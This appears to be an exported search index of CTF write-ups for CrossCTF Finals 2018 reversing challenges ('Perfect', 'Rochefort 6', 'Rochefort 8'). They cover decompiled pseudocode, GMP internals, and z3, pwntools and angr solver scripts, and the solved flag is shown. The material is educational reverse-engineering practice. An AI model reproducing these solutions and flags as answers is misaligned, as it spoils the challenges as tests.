_mp_d[ABS(_mp_size)-1] is the most significant. Whenever _mp_size is non-zero, the most significant limb is non-zero. _mp_alloc _mp_alloc is the number of limbs currently allocated at _mp_d , and naturally _mp_alloc >= ABS(_mp_size) . When an mpz routine is about to (or might be about to) increase _mp_size , it checks _mp_alloc to see whether there\u2019s enough space, and reallocates if not. MPZ_REALLOC is generally used for this. But the manual didn't tell us which field is at which offset. So, we used onlinegdb to test it out, using the following code. #include <stdio.h> #include <gmp.h> int main() { mpz_t g; printf(\"_mp_size\\t%d\\n\", (size_t)&(g->_mp_size)-(size_t)&g); printf(\"_mp_d\\t\\t%d\\n\", (size_t)&(g->_mp_d)-(size_t)&g); printf(\"_mp_alloc\\t%d\\n\", (size_t)&(g->_mp_alloc)-(size_t)&g); return 0; } We get the following output _mp_size 4 _mp_d 8 _mp_alloc 0 So, v10 and v12 are pointing the _mp_size field of v9 and v11 . Checking if they are 0 is equivalent to checking if v9 and v11 are equal to 0. Cleaning up our pseudocode scanf(\"%1023s\", &v15) v11 = int(v15) - 1 v13 = int(v15) while (v11 != 0) { if (v13 % v11 == 0) v8 += v11 v11--; } if (v13 == v8 && v13 > 2^213) print \"random_seed(\" + v8 + \")\" puts(\"k = \\\"\\\".join([chr(random.randint(0, 255)) for i in range(35)])\"); puts(\"xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\"); We see above that v8 is the sum of all factors of v13 , then the program checks if it is equal to our original input, and if it is greater than 2^213. Then, our seed will just be our input number. This means we are looking for perfect numbers greater than 2^213. Solution Since there are a lot of numbers satisfying the condition, we take a few p s from the wikipedia page, and try them out. We will not run the program with these numbers, since it would take very long. Cleaning up the code that is supposedly given import random from pwn import * nums = [107, 127, 521, 521, 607, 1279] def perfectexp(p): return (2**(p-1))*(2**p-1) def run(x): random.seed(perfectexp(x)) k = \"\".join([chr(random.randint(0, 255)) for i in range(35)]) print(xor(k, '754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db'.decode('hex'))) for i in nums: run(i) Running it gives us H\\x88*]\\xb6\\xa3\\x8e\ufffd$\ufffdQ\ufffd5U\ufffdkNn{-\ufffd\ufffd\ufffd_\ufffd\ufffdh\ufffd&\ufffd7mZ\\x8d CrossCTF{why_am_1_aw4ke_r1ght_n0ww} qF V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c qF V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c \ufffd\ufffd\\\ufffd\ufffd{\ufffd-\ufffd?3l]L\\x92B&*9[M\ufffd\ufffd=\ufffd@\ufffd\ufffd\ufffd\ufffdg\ufffd 4~qB\\xaf\ufffd^=\\x0f\ufffdw\ufffd5p\u0011 \\xbe\ufffdy\ufffdi\\xa4o\ufffd\ufffd^\\x88<\\x81&\ufffd;\ufffd","title":"Perfect"},{"location":"crossctf-finals2018/re/perfect/#crossctf-finals-2018-perfect-re","text":"'Cause we lost it all Nothin' lasts forever Creator - amon (@nn_amon) Update: this definitely works with python 2.7.15","title":"CrossCTF Finals 2018 : Perfect (re)"},{"location":"crossctf-finals2018/re/perfect/#challenge","text":"We were given a binary perfect . Opening it up in IDA gives us the following pseudocode. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 v3; // rdx __int64 v4; // rdx __int64 v5; // rdx __int64 v6; // rdx char v8; // [rsp+10h] [rbp-460h] char v9; // [rsp+20h] [rbp-450h] int v10; // [rsp+24h] [rbp-44Ch] char v11; // [rsp+30h] [rbp-440h] int v12; // [rsp+34h] [rbp-43Ch] char v13; // [rsp+40h] [rbp-430h] char v14; // [rsp+50h] [rbp-420h] char v15; // [rsp+60h] [rbp-410h] unsigned __int64 v16; // [rsp+468h] [rbp-8h] v16 = __readfsqword(0x28u); __gmpz_init(&v8); __gmpz_set_ui(&v8, 0LL); __gmpz_init(&v9); __gmpz_set_ui(&v9, 0LL); __gmpz_init(&v11); __gmpz_set_ui(&v11, 0LL); __gmpz_init(&v13); __gmpz_set_ui(&v13, 0LL); __gmpz_init(&v14); __gmpz_set_ui(&v14, 2LL); __gmpz_mul_2exp(&v14, &v14, 212LL); printf(\"Eschucha? \", &v14); __isoc99_scanf(\"%1023s\", &v15); if ( (unsigned int)__gmpz_set_str(&v11, &v15, 10LL) ) __assert_fail(\"flag == 0\", \"perfect.c\", 0x20u, \"main\"); __gmpz_sub_ui(&v11, &v11, 1LL); if ( (unsigned int)__gmpz_set_str(&v13, &v15, 10LL) ) __assert_fail(\"flag == 0\", \"perfect.c\", 0x23u, \"main\"); while ( v12 < 0 || v12 > 0 ) { __gmpz_mod(&v9, &v13, &v11); if ( v10 >= 0 && v10 <= 0 ) __gmpz_add((__int64)&v8, (__int64)&v8, (__int64)&v11); __gmpz_sub_ui(&v11, &v11, 1LL); } if ( !(unsigned int)__gmpz_cmp(&v13, &v8) && (signed int)__gmpz_cmp(&v13, &v14) > 0 ) { printf(\"random.seed(\"); __gmpz_out_str(_bss_start, 10LL, &v8); puts(\")\"); puts(\"k = \\\"\\\".join([chr(random.randint(0, 255)) for i in range(35)])\"); puts(\"xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\"); } __gmpz_clear((__int64)&v8); __gmpz_clear((__int64)&v13); __gmpz_clear((__int64)&v11); __gmpz_clear((__int64)&v9); __gmpz_clear((__int64)&v14); return 0LL; }","title":"Challenge"},{"location":"crossctf-finals2018/re/perfect/#mpz-api","text":"Before continuing, we need to know what does the _gmpz_xxx functions do. Referring to the gmplib manual , we get that __gmpz_init initializes an address to be a mpz object. __gmpz_set_ui sets a mpz object with an unsigned int provided as the 2nd argument. __gmpz_mul_2exp left shifts the 2nd argument by the 3rd argument and stores the result in the 1st argument. __gmpz_add stores the sum of the 2nd argument and the 3rd argument in the 1st argument. __gmpz_sub_ui subtracts the 2nd argument by the 3rd argument and stores the result in the 1st argument. __gmpz_set_str takes the string in the 2nd argument and stores it in the 1st argument, with the 3rd argument being the base. __gmpz_out_str outputs the value of the 3rd argument, with the 2nd argument as the base, and the 1st argument being the output stream. __gmpz_mod takes the result of 2nd argument modulo 3rd argument and stores it in the 1st argument. __gmpz_cmp compares the two arguments and returns a positive number if op1 > op2, zero if op1 = op2, negative number if op1 < op2.","title":"mpz API"},{"location":"crossctf-finals2018/re/perfect/#pseudocode","text":"So, we can simplify the code above further to be v8 = 0 v9 = 0 v11 = 0 v13 = 0 v14 = 2 << 212 scanf(\"%1023s\", &v15) v11 = int(v15) - 1 v13 = int(v15) while (v12 != 0) { v9 = v13 % v11 if (v10 == 0) v8 += v11 v11--; } if (v13 == v8 && v13 > v14) print \"random_seed(\" + v8 + \")\" puts(\"k = \\\"\\\".join([chr(random.randint(0, 255)) for i in range(35)])\"); puts(\"xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\"); So, it looks like the program requests for a number, and does some computations and comparisons with it, and if it passes all checks it gives us a seed that can be used to generate the flag. Hmm, suddenly there's v12 and v10 which we did not initialize at the start. We need to know what they are since the whole control flow relies on them. Looking back at the top of our original pseudocode char v8; // [rsp+10h] [rbp-460h] char v9; // [rsp+20h] [rbp-450h] int v10; // [rsp+24h] [rbp-44Ch] char v11; // [rsp+30h] [rbp-440h] int v12; // [rsp+34h] [rbp-43Ch] char v13; // [rsp+40h] [rbp-430h] char v14; // [rsp+50h] [rbp-420h] char v15; // [rsp+60h] [rbp-410h] We see that each mpz value, v8 , v9 , v11 , v13 and v14 are 16 bytes away from each other on the stack. So they all probably are 16 bytes long. On the other hand, v10 points to the address at an offset of 4 bytes from the address of v9 , and same for v12 and v11 .","title":"pseudocode"},{"location":"crossctf-finals2018/re/perfect/#mpz-internals","text":"To confirm our doubts, we refer to the manual . We see that each mpz_t variable is a struct with the following fields.","title":"mpz internals"},{"location":"crossctf-finals2018/re/perfect/#95mp_size","text":"The number of limbs, or the negative of that when representing a negative integer. Zero is represented by _mp_size set to zero, in which case the _mp_d data is unused.","title":"_mp_size"},{"location":"crossctf-finals2018/re/perfect/#95mp_d","text":"A pointer to an array of limbs which is the magnitude. These are stored \u201clittle endian\u201d as per the mpn functions, so _mp_d[0] is the least significant limb and _mp_d[ABS(_mp_size)-1] is the most significant. Whenever _mp_size is non-zero, the most significant limb is non-zero.","title":"_mp_d"},{"location":"crossctf-finals2018/re/perfect/#95mp_alloc","text":"_mp_alloc is the number of limbs currently allocated at _mp_d , and naturally _mp_alloc >= ABS(_mp_size) . When an mpz routine is about to (or might be about to) increase _mp_size , it checks _mp_alloc to see whether there\u2019s enough space, and reallocates if not. MPZ_REALLOC is generally used for this. But the manual didn't tell us which field is at which offset. So, we used onlinegdb to test it out, using the following code. #include <stdio.h> #include <gmp.h> int main() { mpz_t g; printf(\"_mp_size\\t%d\\n\", (size_t)&(g->_mp_size)-(size_t)&g); printf(\"_mp_d\\t\\t%d\\n\", (size_t)&(g->_mp_d)-(size_t)&g); printf(\"_mp_alloc\\t%d\\n\", (size_t)&(g->_mp_alloc)-(size_t)&g); return 0; } We get the following output _mp_size 4 _mp_d 8 _mp_alloc 0 So, v10 and v12 are pointing the _mp_size field of v9 and v11 . Checking if they are 0 is equivalent to checking if v9 and v11 are equal to 0. Cleaning up our pseudocode scanf(\"%1023s\", &v15) v11 = int(v15) - 1 v13 = int(v15) while (v11 != 0) { if (v13 % v11 == 0) v8 += v11 v11--; } if (v13 == v8 && v13 > 2^213) print \"random_seed(\" + v8 + \")\" puts(\"k = \\\"\\\".join([chr(random.randint(0, 255)) for i in range(35)])\"); puts(\"xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\"); We see above that v8 is the sum of all factors of v13 , then the program checks if it is equal to our original input, and if it is greater than 2^213. Then, our seed will just be our input number. This means we are looking for perfect numbers greater than 2^213.","title":"_mp_alloc"},{"location":"crossctf-finals2018/re/perfect/#solution","text":"Since there are a lot of numbers satisfying the condition, we take a few p s from the wikipedia page, and try them out. We will not run the program with these numbers, since it would take very long. Cleaning up the code that is supposedly given import random from pwn import * nums = [107, 127, 521, 521, 607, 1279] def perfectexp(p): return (2**(p-1))*(2**p-1) def run(x): random.seed(perfectexp(x)) k = \"\".join([chr(random.randint(0, 255)) for i in range(35)]) print(xor(k, '754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db'.decode('hex'))) for i in nums: run(i) Running it gives us H\\x88*]\\xb6\\xa3\\x8e\ufffd$\ufffdQ\ufffd5U\ufffdkNn{-\ufffd\ufffd\ufffd_\ufffd\ufffdh\ufffd&\ufffd7mZ\\x8d CrossCTF{why_am_1_aw4ke_r1ght_n0ww} qF V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c qF V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c \ufffd\ufffd\\\ufffd\ufffd{\ufffd-\ufffd?3l]L\\x92B&*9[M\ufffd\ufffd=\ufffd@\ufffd\ufffd\ufffd\ufffdg\ufffd 4~qB\\xaf\ufffd^=\\x0f\ufffdw\ufffd5p\u0011 \\xbe\ufffdy\ufffdi\\xa4o\ufffd\ufffd^\\x88<\\x81&\ufffd;\ufffd","title":"Solution"},{"location":"crossctf-finals2018/re/rochefort6/","text":"CrossCTF Finals 2018 : Rochefort 6 (re) Nothing like a Rochefort 6 in the hot summer weather... nc ctf.pwn.sg 16667 Creator - waituck (@wongwaituck) binary This challenge uses the same binary as Rochefort 8 Analysis At first the program prompts for a number, 6 would execute the code for this challenge, while 8 for the other challenge. Opening up the function for 6 in IDA gives us unsigned __int64 sub_400AC3() { signed __int64 v0; // r12 unsigned int v1; // eax int v2; // eax unsigned int v3; // er13 __int64 v4; // r14 char s; // [rsp+0h] [rbp-430h] unsigned __int64 v7; // [rsp+408h] [rbp-28h] v0 = 20LL; v7 = __readfsqword(0x28u); v1 = time(0LL); srand(v1); do { v2 = rand(); v3 = (unsigned __int16)(v2 + ((unsigned __int64)v2 >> 48)) - ((unsigned int)(v2 >> 31) >> 16); puts(\"Bet you can't produce the same output :P\"); printf(\"%d\\n\", v3); puts(\"Your turn: \"); if ( !fgets(&s, 1024, stdin) ) { puts(\"Couldn't read your input.\"); exit(1); } v4 = (unsigned int)sub_400A7F((unsigned __int8 *)&s, strlen(&s)); printf(\"Your output is %d\\n\", v4); if ( v3 != (_DWORD)v4 ) { puts(\"FAIL\"); exit(2); } --v0; } while ( v0 ); sub_400C0A(); return __readfsqword(0x28u) ^ v7; } In short, what the program does is it generates a random number, then performs some bit shifting on it. We are then prompted for a string, which will be passed into a function and the result of it will be compared with the number mentioned earlier. For those without IDA (Pro version), and had to read the assembly themselves, they would have gotten a block of assembly code that doesn't look so obvious to be strlen but I believe by playing around with it for a bit, it would have been clear that it is. Let's look at the function at 0x400a7f. __int64 __fastcall sub_400A7F(unsigned __int8 *a1, __int64 a2) { __int64 result; // rax unsigned __int8 *v3; // r12 unsigned __int8 *v4; // rbx int v5; // edi if ( !a2 ) return 0LL; result = 0; v3 = &a1[a2]; v4 = a1; do { v5 = *v4++; result = sub_400AB2((signed int)result + v5); } while ( v3 != v4 ); return (unsigned __int16)result; } Here it seems that the program just takes every byte of the string, or more precisely its ASCII value, adds it to the current result, and calls the function at 0x400AB2 on the sum. Looking at 0x400AB2 __int64 __fastcall sub_400AB2(int a1) { return (unsigned int)(1131573107 * a1 + 1933792326); } Over here, I was in doubt of whether the multiplication was signed or unsigned, so I decided to look at the assembly. / (fcn) fcn.00400ab2 17 | fcn.00400ab2 (); | ; UNKNOWN XREF from 0x00400a9d (fcn.00400a7f) | ; CALL XREF from 0x00400a9d (fcn.00400a7f) | 0x00400ab2 69c7736f7243 imul eax, edi, 0x43726f73 | 0x00400ab8 55 push rbp | 0x00400ab9 4889e5 mov rbp, rsp | 0x00400abc 0546544373 add eax, 0x73435446 | 0x00400ac1 5d pop rbp \\ 0x00400ac2 c3 ret So it uses imul , which is signed assembly. We also noticed that the operands of imul and add are eax which is the lower 32 bits. But this probably didn't really matter to our solution. Solution Solving this looks easy, we can just write a z3 script. To recap, the program Takes a string as user input Goes through every byte and takes its ASCII value Adds that value to result Multiplies result with a large number and add another large number to it As mentioned, we will use z3 to solve this. So, let's prepare the functions that are being used in the challenge first. # 0x400ab2 def ab2(a): return 0x43726f73 * a + 0x73435446 # 0x400a7f def a7f(a1, a2): res = 0 for i in range(a2): res = ab2(res + ZeroExt(24, a1[i])) return Extract(15, 0, res) Notice that at the end of the pseudocode for 0x400a7f there was a cast to unsigned __int16 , in assembly there was a movzx eax, ax , so the final result of a7f will have its higher 16 bytes removed. Since the numbers are all playing in 64-bit space, there will be overflowing happening, especially since the multiplication and addition are with such large numbers. For this, we used a BitVec from z3, which is a vector of bits that behaves like how integers do in C programs. We populate an array of BitVec s, which are 8 bit long. Then, we just pass that array into the functions we defined earlier. s = Solver() inp = [] for j in range(1023): inp.append(BitVec('%d.%d' % (i, j), 8)) outp = a7f(inp, len(inp)) Now, we just need z3 to solve for the current input that would provide the output we want. Before that, we need to add a constraint so that the output using that input would match the output given by the challenge. s.append(outp == value) s.check() try: m = s.model() except Exception: exit(0) sol = [] for j in range(1023): sol.append(chr(m[inp[j]].as_long())) return ''.join(sol) But this didn't work..., because apparently when we send in our input it will end with a newline byte (0x0a). So, we need to add a constraint, that the last byte is equal to 0x0a. s.append(inp[i - 1] == 0x0a) Finally, because the input size could range from 1 to 1024, trying to solve for when the size is 1023 is not a wise idea. We made it such that it will try different lengths ranging from 1 to 1024. def solve_for(value): for i in range(1, 1024): s = Solver() inp = [] for j in range(i): inp.append(BitVec('%d.%d' % (i, j), 8)) s.append(inp[i - 1] == 0x0a) outp = a7f(inp, len(inp)) s.append(outp == value) s.check() try: m = s.model() except Exception: continue sol = [] for j in range(i): sol.append(chr(m[inp[j]].as_long())) return ''.join(sol) All is left is to connect to the server, and solve their outputs. Earlier in our pseudocode, we see that the program asks for a number 20 times, so we had to run a loop. r = remote('ctf.pwn.sg', 16667) # process('./towerofbeer') r.sendline('6') for i in range(20): r.recvuntil(\":P\\n\") num = int(r.recvuntil(\"\\n\").strip()) print num ans = solve_for(num) r.send(ans) r.recvuntil('Your turn:') print r.recv() print r.recv() r.interactive() You can get the whole solution script here . Some eye candy","title":"Tower Of Beer: Rochefort 6"},{"location":"crossctf-finals2018/re/rochefort6/#crossctf-finals-2018-rochefort-6-re","text":"Nothing like a Rochefort 6 in the hot summer weather... nc ctf.pwn.sg 16667 Creator - waituck (@wongwaituck) binary This challenge uses the same binary as Rochefort 8","title":"CrossCTF Finals 2018 : Rochefort 6 (re)"},{"location":"crossctf-finals2018/re/rochefort6/#analysis","text":"At first the program prompts for a number, 6 would execute the code for this challenge, while 8 for the other challenge. Opening up the function for 6 in IDA gives us unsigned __int64 sub_400AC3() { signed __int64 v0; // r12 unsigned int v1; // eax int v2; // eax unsigned int v3; // er13 __int64 v4; // r14 char s; // [rsp+0h] [rbp-430h] unsigned __int64 v7; // [rsp+408h] [rbp-28h] v0 = 20LL; v7 = __readfsqword(0x28u); v1 = time(0LL); srand(v1); do { v2 = rand(); v3 = (unsigned __int16)(v2 + ((unsigned __int64)v2 >> 48)) - ((unsigned int)(v2 >> 31) >> 16); puts(\"Bet you can't produce the same output :P\"); printf(\"%d\\n\", v3); puts(\"Your turn: \"); if ( !fgets(&s, 1024, stdin) ) { puts(\"Couldn't read your input.\"); exit(1); } v4 = (unsigned int)sub_400A7F((unsigned __int8 *)&s, strlen(&s)); printf(\"Your output is %d\\n\", v4); if ( v3 != (_DWORD)v4 ) { puts(\"FAIL\"); exit(2); } --v0; } while ( v0 ); sub_400C0A(); return __readfsqword(0x28u) ^ v7; } In short, what the program does is it generates a random number, then performs some bit shifting on it. We are then prompted for a string, which will be passed into a function and the result of it will be compared with the number mentioned earlier. For those without IDA (Pro version), and had to read the assembly themselves, they would have gotten a block of assembly code that doesn't look so obvious to be strlen but I believe by playing around with it for a bit, it would have been clear that it is. Let's look at the function at 0x400a7f. __int64 __fastcall sub_400A7F(unsigned __int8 *a1, __int64 a2) { __int64 result; // rax unsigned __int8 *v3; // r12 unsigned __int8 *v4; // rbx int v5; // edi if ( !a2 ) return 0LL; result = 0; v3 = &a1[a2]; v4 = a1; do { v5 = *v4++; result = sub_400AB2((signed int)result + v5); } while ( v3 != v4 ); return (unsigned __int16)result; } Here it seems that the program just takes every byte of the string, or more precisely its ASCII value, adds it to the current result, and calls the function at 0x400AB2 on the sum. Looking at 0x400AB2 __int64 __fastcall sub_400AB2(int a1) { return (unsigned int)(1131573107 * a1 + 1933792326); } Over here, I was in doubt of whether the multiplication was signed or unsigned, so I decided to look at the assembly. / (fcn) fcn.00400ab2 17 | fcn.00400ab2 (); | ; UNKNOWN XREF from 0x00400a9d (fcn.00400a7f) | ; CALL XREF from 0x00400a9d (fcn.00400a7f) | 0x00400ab2 69c7736f7243 imul eax, edi, 0x43726f73 | 0x00400ab8 55 push rbp | 0x00400ab9 4889e5 mov rbp, rsp | 0x00400abc 0546544373 add eax, 0x73435446 | 0x00400ac1 5d pop rbp \\ 0x00400ac2 c3 ret So it uses imul , which is signed assembly. We also noticed that the operands of imul and add are eax which is the lower 32 bits. But this probably didn't really matter to our solution.","title":"Analysis"},{"location":"crossctf-finals2018/re/rochefort6/#solution","text":"Solving this looks easy, we can just write a z3 script. To recap, the program Takes a string as user input Goes through every byte and takes its ASCII value Adds that value to result Multiplies result with a large number and add another large number to it As mentioned, we will use z3 to solve this. So, let's prepare the functions that are being used in the challenge first. # 0x400ab2 def ab2(a): return 0x43726f73 * a + 0x73435446 # 0x400a7f def a7f(a1, a2): res = 0 for i in range(a2): res = ab2(res + ZeroExt(24, a1[i])) return Extract(15, 0, res) Notice that at the end of the pseudocode for 0x400a7f there was a cast to unsigned __int16 , in assembly there was a movzx eax, ax , so the final result of a7f will have its higher 16 bytes removed. Since the numbers are all playing in 64-bit space, there will be overflowing happening, especially since the multiplication and addition are with such large numbers. For this, we used a BitVec from z3, which is a vector of bits that behaves like how integers do in C programs. We populate an array of BitVec s, which are 8 bit long. Then, we just pass that array into the functions we defined earlier. s = Solver() inp = [] for j in range(1023): inp.append(BitVec('%d.%d' % (i, j), 8)) outp = a7f(inp, len(inp)) Now, we just need z3 to solve for the current input that would provide the output we want. Before that, we need to add a constraint so that the output using that input would match the output given by the challenge. s.append(outp == value) s.check() try: m = s.model() except Exception: exit(0) sol = [] for j in range(1023): sol.append(chr(m[inp[j]].as_long())) return ''.join(sol) But this didn't work..., because apparently when we send in our input it will end with a newline byte (0x0a). So, we need to add a constraint, that the last byte is equal to 0x0a. s.append(inp[i - 1] == 0x0a) Finally, because the input size could range from 1 to 1024, trying to solve for when the size is 1023 is not a wise idea. We made it such that it will try different lengths ranging from 1 to 1024. def solve_for(value): for i in range(1, 1024): s = Solver() inp = [] for j in range(i): inp.append(BitVec('%d.%d' % (i, j), 8)) s.append(inp[i - 1] == 0x0a) outp = a7f(inp, len(inp)) s.append(outp == value) s.check() try: m = s.model() except Exception: continue sol = [] for j in range(i): sol.append(chr(m[inp[j]].as_long())) return ''.join(sol) All is left is to connect to the server, and solve their outputs. Earlier in our pseudocode, we see that the program asks for a number 20 times, so we had to run a loop. r = remote('ctf.pwn.sg', 16667) # process('./towerofbeer') r.sendline('6') for i in range(20): r.recvuntil(\":P\\n\") num = int(r.recvuntil(\"\\n\").strip()) print num ans = solve_for(num) r.send(ans) r.recvuntil('Your turn:') print r.recv() print r.recv() r.interactive() You can get the whole solution script here .","title":"Solution"},{"location":"crossctf-finals2018/re/rochefort6/#some-eye-candy","text":"","title":"Some eye candy"},{"location":"crossctf-finals2018/re/rochefort8/","text":"CrossCTF Finals 2018 : Rochefort 8 (re) Why have a Rochefort 6 when you can have a Rochefort 8? nc ctf.pwn.sg 16667 Creator - waituck (@wongwaituck) towerofbeer Analysis Like rochefort6 , it asks for a number, we choose 8, then it presents us with the challenge. Being noob and using IDA gives us unsigned __int64 sub_401209() { __int64 v1; // [rsp+8h] [rbp-158h] char v2; // [rsp+10h] [rbp-150h] __int64 v3; // [rsp+30h] [rbp-130h] __int64 v4; // [rsp+38h] [rbp-128h] __int64 v5; // [rsp+58h] [rbp-108h] int v6; // [rsp+60h] [rbp-100h] int *v7; // [rsp+68h] [rbp-F8h] int *v8; // [rsp+70h] [rbp-F0h] __int64 v9; // [rsp+78h] [rbp-E8h] int *v10; // [rsp+80h] [rbp-E0h] int v11; // [rsp+88h] [rbp-D8h] __int64 v12; // [rsp+90h] [rbp-D0h] int *v13; // [rsp+98h] [rbp-C8h] int *v14; // [rsp+A0h] [rbp-C0h] __int64 *v15; // [rsp+A8h] [rbp-B8h] int v16; // [rsp+B0h] [rbp-B0h] __int64 v17; // [rsp+B8h] [rbp-A8h] int *v18; // [rsp+C0h] [rbp-A0h] int *v19; // [rsp+C8h] [rbp-98h] __int64 v20; // [rsp+D0h] [rbp-90h] int v21; // [rsp+D8h] [rbp-88h] __int64 *v22; // [rsp+E0h] [rbp-80h] __int64 v23; // [rsp+E8h] [rbp-78h] __int64 v24; // [rsp+F0h] [rbp-70h] __int64 v25; // [rsp+F8h] [rbp-68h] int v26; // [rsp+100h] [rbp-60h] __int64 *v27; // [rsp+108h] [rbp-58h] __int64 v28; // [rsp+110h] [rbp-50h] __int64 v29; // [rsp+118h] [rbp-48h] __int64 v30; // [rsp+120h] [rbp-40h] int v31; // [rsp+128h] [rbp-38h] __int64 v32; // [rsp+130h] [rbp-30h] __int64 v33; // [rsp+138h] [rbp-28h] int *v34; // [rsp+140h] [rbp-20h] __int64 v35; // [rsp+148h] [rbp-18h] unsigned __int64 v36; // [rsp+158h] [rbp-8h] v36 = __readfsqword(0x28u); if ( ptrace(0, 0LL, 1LL, 0LL) == -1 ) { puts(\"Something bad happened!\"); exit(1); } printf(\"This address may be interesting...\\n0x%lx\\n\", &v6); v6 = 3; v11 = 5; v16 = 1; v21 = 6; v26 = 2; v31 = 4; v7 = &v11; v8 = &v16; v9 = 0LL; v10 = &v11; v12 = -3LL; v13 = &v21; v14 = &v26; v15 = &v4; v17 = 0x7FFFFFFFFFFFFFFFLL; v18 = &v26; v19 = &v31; v20 = 0LL; v22 = &v3; v23 = 0LL; v24 = 0LL; v25 = -3405691582LL; v27 = &v5; v28 = 0LL; v29 = 0LL; v30 = -1LL; v32 = 0LL; v33 = 1LL; v34 = &v21; v35 = 0LL; puts(\"Now let's see if you can read my mind. Give me 10 numbers!\"); sub_4009D6((__int64)&v2); v1 = 0LL; some_func((__int64)&v6, (__int64)&v2, &v1); if ( v1 != 5 ) { puts(\"FAIL\"); exit(1); } sub_400CAC(); return __readfsqword(0x28u) ^ v36; } __int64 __fastcall sub_4009D6(__int64 a1) { __int64 result; // rax result = (signed int)__isoc99_scanf( \"%ld %ld %ld %ld %ld %ld %ld %ld %ld %ld\", a1, a1 + 8, a1 + 16, a1 + 24, a1 + 32, a1 + 40, a1 + 48, a1 + 56, a1 + 64, a1 + 72); if ( (unsigned __int64)(signed int)result <= 9 ) { puts(\"FAIL\"); exit(1); } return result; } __int64 __fastcall some_func(__int64 a1, __int64 a2, _QWORD *a3) { __int64 result; // rax _QWORD *v4; // [rsp+8h] [rbp-38h] __int64 v5; // [rsp+30h] [rbp-10h] __int64 v6; // [rsp+38h] [rbp-8h] v4 = a3; v5 = sub_400D4E(a1); result = sub_400DC3(a1); v6 = result; if ( v5 ) { if ( (unsigned __int8)sub_400F22(a1, v5, *(_QWORD *)(8LL * *v4 + a2), *(_QWORD *)(8 * (*v4 + 5LL) + a2), 1) ) ++*v4; result = some_func(v5, a2, v4); } if ( v6 ) { if ( (unsigned __int8)sub_400F22(a1, v6, *(_QWORD *)(8LL * *v4 + a2), *(_QWORD *)(8 * (*v4 + 5LL) + a2), 0) ) ++*v4; result = some_func(v6, a2, v4); } return result; } _BOOL8 __fastcall sub_400F22(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5) { char v6; // [rsp+4h] [rbp-74h] __int64 v7; // [rsp+8h] [rbp-70h] __int64 v8; // [rsp+10h] [rbp-68h] __int64 v9; // [rsp+28h] [rbp-50h] __int64 v10; // [rsp+30h] [rbp-48h] __int64 v11; // [rsp+38h] [rbp-40h] __int64 v12; // [rsp+40h] [rbp-38h] __int64 v13; // [rsp+58h] [rbp-20h] __int64 v14; // [rsp+60h] [rbp-18h] v8 = a3; v7 = a4; v6 = a5; v9 = sub_400E38(a1); v10 = sub_400E38(a2); if ( v6 ) { if ( v9 <= v8 ) return 0LL; } else if ( v9 >= v8 ) { return 0LL; } if ( v8 == v10 ) return 0LL; v11 = sub_400D4E(a2); v12 = sub_400DC3(a2); if ( v11 && sub_400E38(v11) >= v8 ) return 0LL; if ( v12 && sub_400E38(v12) <= v8 ) return 0LL; v13 = sub_400EAD(a1); v14 = sub_400EAD(a2); if ( v6 ) { if ( v13 <= v7 ) return 0LL; } else if ( v13 >= v7 ) { return 0LL; } if ( v7 == v14 ) return 0LL; if ( v11 && sub_400EAD(v11) >= v7 ) return 0LL; return !v12 || sub_400EAD(v12) > v7; } Very long code, to summarize, it Prints out an address on the stack Does a ton of initialization on the variables Calls scanf to read in 10 signed integers Calls some_func (it was a stripped binary, I named it this) with some paremeters, that seemed to be stack addresses casted to integer. If the result is equal to 5, print flag In some_func and sub_400F22 , we see 3 more different functions. __int64 __fastcall sub_400D4E(__int64 a1) { __int64 result; // rax if ( !a1 ) return 0LL; switch ( *(_DWORD *)a1 ) { case 1: result = *(_QWORD *)(a1 + 24); break; case 2: result = *(_QWORD *)(a1 + 16); break; case 3: result = *(_QWORD *)(a1 + 8); break; case 4: result = *(_QWORD *)(a1 + 32); break; case 5: result = *(_QWORD *)(a1 + 16); break; case 6: result = *(_QWORD *)(a1 + 24); break; default: result = 0LL; break; } return result; } This function uses the argument passed in as an array, and returns the value in an index that is based on the first element in the array. The other 2 were pretty much the same, just that the offset values were different. Reversing them Lots of functions, lots of adding and subtracting, lots of casting from integer to pointer, and seems like there's even recursion. It's gonna be a pain to reverse them. So nah man I didn't want to reverse this. I just used angr to do the work. Yes, I really didn't bother reversing it at all. Solution I wrote a script with angr to make things easier. (The following is more of my thought process, if not interested, looking at the script should be enough) First things first, create a project in angr, and initialize a state that starts at sub_401209 , which is the function called after we enter \"8\" into the program (because everything before that is useless). binary_name = sys.argv[1] project = angr.Project(binary_name) initial_state = project.factory.blank_state(addr=0x401209) Also, I have to \"define\" scanf myself because angr does not work well with format string related stuff. Inside my own scanf , I created 10 symbolic values to represent our input, and store them in memory. In the end, set return value to be 10, because the program checks for it. That being said, I also have to \"skip\" the instruction at 0x40126f which calls printf . (If you reversed the binary, you may feel that something's wrong, because the output of printf is important. Yes, I made a mistake, which I'll mention later.) initial_state.globals['solutions'] = [] class ReplacementScanf(angr.SimProcedure): def run(self, format_string, s1, s2, s3, s4, s5, s6, s7, s8, s9, s10): scanf1 = claripy.BVS('scanf1', 64) scanf2 = claripy.BVS('scanf2', 64) scanf3 = claripy.BVS('scanf3', 64) 